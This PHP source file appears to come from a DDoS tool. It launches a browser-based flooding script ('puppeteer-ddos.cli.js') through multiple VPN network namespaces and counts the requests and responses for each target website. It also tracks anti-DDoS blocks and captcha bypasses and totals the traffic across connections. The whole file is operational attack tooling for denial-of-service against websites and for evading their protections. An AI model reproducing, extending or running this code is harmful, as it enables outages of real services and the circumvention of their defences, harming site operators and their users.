<?php

class PuppeteerApplication extends HackApplication
{
    private $process,
            $processPGid,
            $pipes,
            $wasLaunched = false,
            $launchFailed = false,
            $currentCountry = '',
            $stat,
            $stdoutBrokenLineCount,
            $stdoutBuffer,
            $statisticsBadgePreviousRet = '',
            $requireBlockerBypass = 0,
            $workingDirectory,
            $exitCode = -1,
            $debug = true;


    public function processLaunch()
    {

        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        //---

        $this->workingDirectory = static::$workingDirectoryRoot . '/VPN' . $this->vpnConnection->getIndex();
        rmdirRecursive($this->workingDirectory);
        mkdir($this->workingDirectory, changeLinuxPermissions(0, 'rwx', 'rwx'));
        chmod($this->workingDirectory, changeLinuxPermissions(0, 'rwx', 'rwx'));
        chown($this->workingDirectory, 'user');
        chgrp($this->workingDirectory, 'user');

        //---

        $command = 'cd "' . __DIR__ . '" ;   '
                 . 'ip netns exec ' . $this->vpnConnection->getNetnsName() . '   '
                 . "nice -n 10   /sbin/runuser  -u user  -g user   --   "
                 . __DIR__ . "/puppeteer-ddos.cli.js  "
                 . "--connection-index=" . $this->vpnConnection->getIndex() . "  --working-directory=\"{$this->workingDirectory}\"  --enable-stdin-commands"
                 . "   2>&1";

        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        $this->processPGid = procChangePGid($this->process, $log);
        $this->log($log);
        if ($this->processPGid === false) {
            $this->terminateAndKill(true);
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        $this->stat = new \stdClass();
        $this->stat->targets = [];
        $this->stat->total = null;
        return true;
    }

    public function pumpLog($flushBuffers = false) : string
    {
        $ret = $this->log;
        $this->log = '';

        if (!$this->readChildProcessOutput) {
            goto retu;
        }

        //------------------- read stdout -------------------

        $this->stdoutBuffer .= streamReadLines($this->pipes[1], 0);
        if ($flushBuffers) {
            $ret = $this->stdoutBuffer;
        } else {
            // --- Split lines
            $lines = mbSplitLines($this->stdoutBuffer);
            // --- Remove terminal markup
            $lines = array_map('\Term::removeMarkup', $lines);
            // --- Remove empty lines
            $lines = mbRemoveEmptyLinesFromArray($lines);

            foreach ($lines as $lineIndex => $line) {
                $lineObj = json_decode($line);

                if (is_object($lineObj)) {

                    unset($lines[$lineIndex]);
                    $this->stdoutBrokenLineCount = 0;
                    $ret .= $this->processJsonLine($line, $lineObj);

                } else {

                    $this->stdoutBrokenLineCount++;
                    if ($this->stdoutBrokenLineCount > 3) {
                        $this->stdoutBrokenLineCount = 0;
                        $ret .= $line . "\n";
                        unset($lines[$lineIndex]);
                    }
                    break;
                }
            }
            $this->stdoutBuffer = implode("\n", $lines);
        }

        retu:
        $ret = mbRTrim($ret);

        return $ret;
    }

    private function processJsonLine($line, $lineObj)
    {
        if (isset($lineObj->requireBlockerBypass)) {
            $this->requireBlockerBypass = $lineObj->requireBlockerBypass;
        }

        $requestType = val($lineObj, 'type');
        if ($requestType === 'terminate') {
            $this->stat->targets = [];
            return 'Exit message: ' . val($lineObj, 'message');

        } else if ($requestType  &&  in_array($requestType, ['http-plain-get', 'http-render-get'])) {

            $entryUrl        = getUrlOrigin(val($lineObj, 'navigateUrl'));
            $success         = val($lineObj, 'success');
            $duration        = val($lineObj, 'duration');
            $navigateTimeout = val($lineObj, 'navigateTimeout');
            $requireBlockerBypass = val($lineObj, 'requireBlockerBypass');

            $newStatItem = new \stdClass();
            $newStatItem->httpRequestsSent               = 0;
            $newStatItem->httpEffectiveResponsesReceived = 0;
            $newStatItem->navigateTimeouts               = 0;
            $newStatItem->httpRenderRequestsSent         = 0;
            $newStatItem->ddosBlockedRequests            = 0;
            $newStatItem->sumDuration                    = 0;

            if (!$this->stat->total) {
                $this->stat->total = $newStatItem;
            }

            $targetItem = $this->stat->targets[$entryUrl] ?? null;
            if (!$targetItem) {
                $targetItem = $newStatItem;
            }

            $this->stat->total->httpRequestsSent++;
                   $targetItem->httpRequestsSent++;
                   
            if ($success) {
                $this->stat->total->httpEffectiveResponsesReceived++;
                       $targetItem->httpEffectiveResponsesReceived++;
            }

            if ($navigateTimeout) {
                $this->stat->total->navigateTimeouts++;
                       $targetItem->navigateTimeouts++;
            }

            if ($requestType === 'http-render-get') {
                $this->stat->total->httpRenderRequestsSent++;
                       $targetItem->httpRenderRequestsSent++;
            }

            if ($requireBlockerBypass) {
                $this->stat->total->ddosBlockedRequests++;
                       $targetItem->ddosBlockedRequests++;
            }            

            if ($duration) {
                $this->stat->total->sumDuration += $duration;
                       $targetItem->sumDuration += $duration;
            }

            $this->stat->targets[$entryUrl] = $targetItem;

        } else if (!$this->debug) {
            return $this->lineObjectToString($lineObj) . "\n\n";
        }

        if ($this->debug) {
            return $this->lineObjectToString($lineObj) . "\n\n";
        }
    }

    // Should be called after pumpLog()
    public function getStatisticsBadge() : ?string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT, $getStatisticsBadge___previousRet;
        
        if (!count($this->stat->targets)) {
            return null;
        }

        $columnsDefinition = [
            [
                'title' => ['Target'],
                'width' => $LOG_WIDTH - $LOG_PADDING_LEFT - 12 * 6,
                'trim'  => 4
            ],
            [
                'title' => ['Requests', 'sent'],
                'width' => 12,
                'trim'  => 2,
                'alignRight' => true
            ],

            [
                'title' => ['Effective' , 'responses'],
                'width' => 12,
                'trim'  => 2,
                'alignRight' => true
            ],
            [
                'title' => ['Navigate' , 'timeouts'],
                'width' => 12,
                'trim'  => 2,
                'alignRight' => true
            ],
            [
                'title' => ['Render', 'requests'],
                'width' => 12,
                'trim'  => 2,
                'alignRight' => true
            ],
            [
                'title' => ['Anti-DDoS' , 'block'],
                'width' => 12,
                'trim'  => 2,
                'alignRight' => true
            ],
            [
                'title' => ['Average' , 'duration'],
                'width' => 12,
                'trim'  => 2,
                'alignRight' => true
            ],
        ];
        $rows[] = [];  // new line

        foreach ($this->stat->targets as $targetName => $targetStat) {
            $row = [
                $targetName,
                $targetStat->httpRequestsSent,
                $targetStat->httpEffectiveResponsesReceived,
                $targetStat->navigateTimeouts,
                $targetStat->httpRenderRequestsSent,
                $targetStat->ddosBlockedRequests,
                intRound($targetStat->sumDuration / $targetStat->httpRequestsSent)
            ];
            $rows[] = $row;
        }

        $rows[] = [];  // new line
        $rows[] = [
            'Total',
            $this->stat->total->httpRequestsSent,
            $this->stat->total->httpEffectiveResponsesReceived,
            $this->stat->total->navigateTimeouts,
            $this->stat->total->httpRenderRequestsSent,
            $this->stat->total->ddosBlockedRequests,
            intRound($this->stat->total->sumDuration / $this->stat->total->httpRequestsSent)
        ];

        $ret = mbRTrim(generateMonospaceTable($columnsDefinition, $rows));
        if ($ret === $this->statisticsBadgePreviousRet) {
            return null;
        } else {
            $this->statisticsBadgePreviousRet = $ret;
            return $ret;
        }
    }

    // Should be called after pumpLog()
    public function getEfficiencyLevel()
    {
        $requests           = $this->stat->total->httpRequestsSent                ??  0;
        $effectiveResponses = $this->stat->total->httpEffectiveResponsesReceived  ??  0;
        $navigateTimeouts   = $this->stat->total->navigateTimeouts  ??  0;

        if ($requests < 50) {
            return null;
        }

        if ($effectiveResponses > 10) {
            $averageResponseRate = ($effectiveResponses + $navigateTimeouts) * 100 / $requests;
        } else {
            $averageResponseRate = $effectiveResponses * 100 / $requests;
        }

        return roundLarge($averageResponseRate);
    }

    // Should be called after pumpLog()
    public function getCurrentCountry()
    {
        return null;
    }

    public function isAlive()
    {
        if (!is_resource($this->process)) {
            return false;
        }
        $this->getExitCode();

        $processStatus = proc_get_status($this->process);
        return $processStatus['running'];
    }

    public function getExitCode()
    {
        $processStatus = proc_get_status($this->process);  // Only first call of this function return real value,
                                                           // next calls return -1.
        if ($processStatus['exitcode'] !== -1) {
            $this->exitCode = $processStatus['exitcode'];
        }
        return $this->exitCode;
    }

    public function terminate($hasError)
    {
        if ($this->processPGid) {
            $networkStats = $this->vpnConnection->calculateNetworkStats();
            static::$closedPuppeteerApplicationsNetworkStats->received    += $networkStats->total->received;
            static::$closedPuppeteerApplicationsNetworkStats->transmitted += $networkStats->total->transmitted;
            static::$closedPuppeteerApplicationsNetworkStats->effectiveResponsesReceived += $this->stat->total->httpEffectiveResponsesReceived ?? 0;

            // ---

            $this->log("puppeteer-ddos.cli.js terminate PGID -{$this->processPGid}", true);
            @posix_kill(0 - $this->processPGid, SIGTERM);
            // ---
            $subProcessesPids = [];
            getProcessPidWithChildrenPids($this->processPGid, true, $subProcessesPids);
            if (count($subProcessesPids)) {
                $this->log('; browser PIDs:', true);
                foreach ($subProcessesPids as $subProcessPid) {
                    $this->log(' ' . $subProcessPid, true);
                    @posix_kill($subProcessPid, SIGTERM);
                }
            }
        }
    }

    public function kill()
    {
        if ($this->processPGid) {
            $this->log("puppeteer-ddos.cli.js kill PGID -{$this->processPGid}", true);
            @posix_kill(0 - $this->processPGid, SIGKILL);
            // ---
            $subProcessesPids = [];
            getProcessPidWithChildrenPids($this->processPGid, true, $subProcessesPids);
            if (count($subProcessesPids)) {
                $this->log('; browser PIDs:', true);
                foreach ($subProcessesPids as $subProcessPid) {
                    $this->log(' ' . $subProcessPid, true);
                    @posix_kill($subProcessPid, SIGKILL);
                }
            }
        }
        @proc_terminate($this->process, SIGKILL);
        @proc_close($this->process);

        rmdirRecursive($this->workingDirectory);
    }

    public function isWaitingForCaptchaResolution()
    {
        return $this->requireBlockerBypass === 2;
    }

    public function sendStdinCommand($command)
    {
        fputs($this->pipes[0], "$command\n");
    }

    // ----------------------  Static part of the class ----------------------

    private static int     $puppeteerApplicationStartedDuringThisSession = 0;
    private static string  $workingDirectoryRoot;
    private static int     $lastPlayedCaptchaSound = 0;
    private static object  $closedPuppeteerApplicationsNetworkStats,
                           $runningPuppeteerApplicationsNetworkStats,
                           $runningPuppeteerApplicationsNetworkStatsThisSession;
   private static int      $runningPuppeteerApplicationsCount;

    public static function constructStatic()
    {
        global $TEMP_DIR;

        static::$workingDirectoryRoot = $TEMP_DIR . '/puppeteer-ddos';

        static::$closedPuppeteerApplicationsNetworkStats = new \stdClass();
        static::$closedPuppeteerApplicationsNetworkStats->received = 0;
        static::$closedPuppeteerApplicationsNetworkStats->transmitted = 0;
        static::$closedPuppeteerApplicationsNetworkStats->effectiveResponsesReceived = 0;

        static::$runningPuppeteerApplicationsNetworkStats = new \stdClass();
        static::$runningPuppeteerApplicationsNetworkStatsThisSession = new \stdClass();
        static::$runningPuppeteerApplicationsCount = 0;

        rmdirRecursive(static::$workingDirectoryRoot);
        mkdir(static::$workingDirectoryRoot);
        chmod(static::$workingDirectoryRoot, changeLinuxPermissions(0, 'rwx', 'rwx'));
        chown(static::$workingDirectoryRoot, 'user');
        chgrp(static::$workingDirectoryRoot, 'user');

        killZombieProcesses('chrome');
        killZombieProcesses('nodejs');

        Actions::addAction('AfterInitSession',             [static::class, 'actionAfterInitSession']);
        Actions::addAction('BeforeTerminateSession',       [static::class, 'actionBeforeTerminateSession']);
        Actions::addFilter('OpenVpnStatisticsBadge',        [static::class, 'filterOpenVpnStatisticsBadge']);
        Actions::addFilter('OpenVpnStatisticsSessionBadge', [static::class, 'filterOpenVpnStatisticsSessionBadge']);
        Actions::addAction('AfterMainOutputLoopIteration', [static::class, 'showCaptchaBrowsers']);

    }

    public static function actionAfterInitSession()
    {
        static::$puppeteerApplicationStartedDuringThisSession = 0;
        static::$lastPlayedCaptchaSound = 0;
    }

    public static function actionBeforeTerminateSession()
    {
        static::$runningPuppeteerApplicationsNetworkStats->received = 0;
        static::$runningPuppeteerApplicationsNetworkStats->transmitted = 0;
        static::$runningPuppeteerApplicationsNetworkStats->effectiveResponsesReceived = 0;

        static::$runningPuppeteerApplicationsNetworkStatsThisSession->received = 0;
        static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted = 0;

        static::$runningPuppeteerApplicationsCount = 0;

        foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
            $networkStats = $puppeteerApplication->vpnConnection->calculateNetworkStats();

            static::$runningPuppeteerApplicationsNetworkStats->received    += $networkStats->total->received;
            static::$runningPuppeteerApplicationsNetworkStats->transmitted += $networkStats->total->transmitted;
            static::$runningPuppeteerApplicationsNetworkStats->effectiveResponsesReceived += $puppeteerApplication->stat->total->httpEffectiveResponsesReceived ?? 0;

            static::$runningPuppeteerApplicationsNetworkStatsThisSession->received    += $networkStats->session->received;
            static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted += $networkStats->session->transmitted;

            static::$runningPuppeteerApplicationsCount++;
        }
    }

    public static function filterOpenVpnStatisticsSessionBadge($value)
    {
        if (
                $value
            &&  static::$runningPuppeteerApplicationsNetworkStatsThisSession->received
            &&  static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted
        ) {
            $value .= OpenVpnStatistics::getTrafficMessage(
                'PuppeteerDDoS session traffic',
                static::$runningPuppeteerApplicationsNetworkStatsThisSession->received,
                static::$runningPuppeteerApplicationsNetworkStatsThisSession->transmitted
            );
            $value .= ', through ' . static::$runningPuppeteerApplicationsCount . ' VPN connection(s)';
            $value .= " \n";
        }
        return $value;
    }

    public static function filterOpenVpnStatisticsBadge($value)
    {
        global $SCRIPT_STARTED_AT;

        $totalReceivedTraffic       = static::$closedPuppeteerApplicationsNetworkStats->received
                                    + static::$runningPuppeteerApplicationsNetworkStats->received;

        $totalTransmittedTraffic    = static::$closedPuppeteerApplicationsNetworkStats->transmitted
                                    + static::$runningPuppeteerApplicationsNetworkStats->transmitted;

        $effectiveResponsesReceived = static::$closedPuppeteerApplicationsNetworkStats->effectiveResponsesReceived
                                    + static::$runningPuppeteerApplicationsNetworkStats->effectiveResponsesReceived;

        if (
                $value
            &&  $totalReceivedTraffic
            &&  $totalTransmittedTraffic
            &&  $effectiveResponsesReceived
        ) {
            $value .= OpenVpnStatistics::getTrafficMessage(
                'PuppeteerDDoS total traffic',
                $totalReceivedTraffic,
                $totalTransmittedTraffic
            );

            $effectiveResponsesReceivedRate = roundLarge($effectiveResponsesReceived / (time() - $SCRIPT_STARTED_AT));
            $value .= ", $effectiveResponsesReceived effective response(s) received (~$effectiveResponsesReceivedRate per second)\n";
        }
        return $value;
    }

    public static function getNewObject($vpnConnection)
    {
        global $IS_IN_DOCKER, $PARALLEL_VPN_CONNECTIONS_QUANTITY,
               $PUPPETEER_DDOS_CONNECTIONS_QUOTA, $PUPPETEER_DDOS_ADD_CONNECTIONS_PER_SESSION;

        if ($IS_IN_DOCKER) {
            return false;
        }
        $puppeteerApplicationRunningInstancesCount = count(PuppeteerApplication::getRunningInstances());

        if (
                $PUPPETEER_DDOS_CONNECTIONS_QUOTA
            &&  $puppeteerApplicationRunningInstancesCount             <  $PUPPETEER_DDOS_CONNECTIONS_QUOTA * $PARALLEL_VPN_CONNECTIONS_QUANTITY
            &&  static::$puppeteerApplicationStartedDuringThisSession  <  $PUPPETEER_DDOS_ADD_CONNECTIONS_PER_SESSION
        ) {
            static::$puppeteerApplicationStartedDuringThisSession++;
            return new PuppeteerApplication($vpnConnection);
        } else {
            return false;
        }
    }

    public static function showCaptchaBrowsers()
    {
        global $MAIN_OUTPUT_LOOP_ITERATIONS_COUNT;

        if ($MAIN_OUTPUT_LOOP_ITERATIONS_COUNT === 1) {
            foreach (PuppeteerApplication::getRunningInstances() as $puppeteerApplication) {
                $puppeteerApplication->sendStdinCommand('show-captcha-browsers');
            }
        }
    }

}

PuppeteerApplication::constructStatic();